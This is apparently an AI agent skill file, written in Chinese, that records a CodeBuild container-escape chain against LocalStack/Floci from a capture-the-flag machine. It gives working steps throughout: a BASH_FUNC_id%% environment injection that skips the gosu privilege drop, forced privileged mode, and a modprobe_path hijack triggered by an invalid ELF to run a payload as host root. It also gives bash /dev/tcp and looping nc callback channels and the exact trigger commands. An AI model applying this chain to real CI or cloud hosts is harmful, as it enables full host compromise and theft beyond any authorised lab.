---
name: 'codebuild-floci-escape'
description: 'LocalStack/Floci CodeBuild 容器逃逸：BASH_FUNC_id%% 绕过 entrypoint gosu 降权 + project 名污染 + modprobe_path 劫持拿宿主机 root。'
whenToUse: '遇到 LocalStack(floci)/CodeBuild/CI 容器靶机，Lambda 容器无逃逸点、需从 CodeBuild 特权容器逃到宿主机时。'
disable-model-invocation: true
metadata: { domain: linux, tier: T3 }
---

## 攻击链
floci:4566 直连（无签名）→ CodeBuild create-project + start-build → BASH_FUNC_id%% 函数注入绕过 entrypoint 的 gosu floci 降权 → 容器以 root 运行 → CAP_SYS_ADMIN + modprobe_path 劫持 → 触发非法 ELF → 宿主机 root 执行 payload → 回连读 root.txt

## 关键细节
1. BASH_FUNC_id%% 不是 cosmetic：Floci entrypoint.sh 有 `exec gosu floci "$0" "$@"`；注入环境变量 `BASH_FUNC_id%%='() { echo "uid=0(root)..."; }'` 使 entrypoint 里 `id` 检查返回 uid=0 → 跳过 gosu → 真 root 运行
2. 降权绕过成功后 root 执行 CMD（`mkdir -p /codebuild/... && tail -f /dev/null`）→ 容器保活 → docker exec 可用
3. project 名污染：boto3 create_project 缓存配置，同名重建复用坏配置 → 每次删旧 project + 换全新名字
4. CLI 格式：`aws --cli-input-json file://project.json` 在 Floci 1.5.17 正确处理；boto3 序列化可能微妙失配（buildspec 换行、环境变量格式）
5. modprobe_path：容器 CAP_SYS_ADMIN 时写 /proc/sys/kernel/modprobe 指向恶意脚本，触发非法 ELF 执行 → 宿主机 root

## 🔴 实战补充（2026-08-16 Nimbus 复打新增 quirk，比 2026-06 记忆更细）
1. **镜像唯一可用**：`image` 字段必填、Floci 无默认镜像，`floci/floci:latest` 是唯一带正确 ENTRYPOINT（gosu 降权+id 检查）的镜像——批量猜 localstack/nginx/redis 全是死路
2. **FAULT ≠ FAILED**：FAULT=容器启动失败（镜像/参数错）；FAILED=容器起来了但 buildspec 命令失败（此时可能已降权成功，别误判）
3. **buildspec 第一条必须是 `mkdir -p /codebuild/output`**（+ /codebuild/tmp）：Floci exec 工作目录依赖它，缺失 → 空 buildspec 能 SUCCEEDED、带命令就 FAILED 的诡异现象
4. **privilegedMode 必须显式 true**：默认无 SYS_ADMIN（CapEff 只有 a80425fb），modprobe 写不了；显式开 → CapEff=000001ffffffffff
5. **buildspec 命令数别超过 ~2 条**：超了 Floci 后续命令执行异常 → 关键链压缩成单条命令
6. **upperdir 从 /proc/self/mounts 取**：/etc/mtab 是宿主机视角会错；取 overlay 挂载的 upperdir= 字段才是本容器可写层在宿主机的真实路径
7. **回传通道**：镜像无 python3 时用 bash /dev/tcp；单次 nc 收一条连接就退出 → 用 `(while true; do nc -lvnp <p>; sleep 1; done &)` 循环监听；dash 不支持 `echo -e` → 用 `printf`
8. **触发**：`printf '\xff\xff\xff\xff' > /tmp/x; chmod +x /tmp/x; /tmp/x` 非法 ELF → 宿主机内核调 modprobe → pwn.sh 以宿主机 root 执行

## 教训
- 删除 BASH_FUNC_id%% 会致容器以 floci 运行、mkdir 失败秒死（当年 51 次失败根因）
- 不要在 Lambda/ECS/pidMode 上浪费时间：LocalStack Lambda 容器无逃逸点
- 判 build 状态先分清 FAULT（容器）与 FAILED（命令）两个维度，省一次误判
- 来源：Nimbus HTB（2026-06 完整链记忆 + 2026-08 DSH 复打实战）
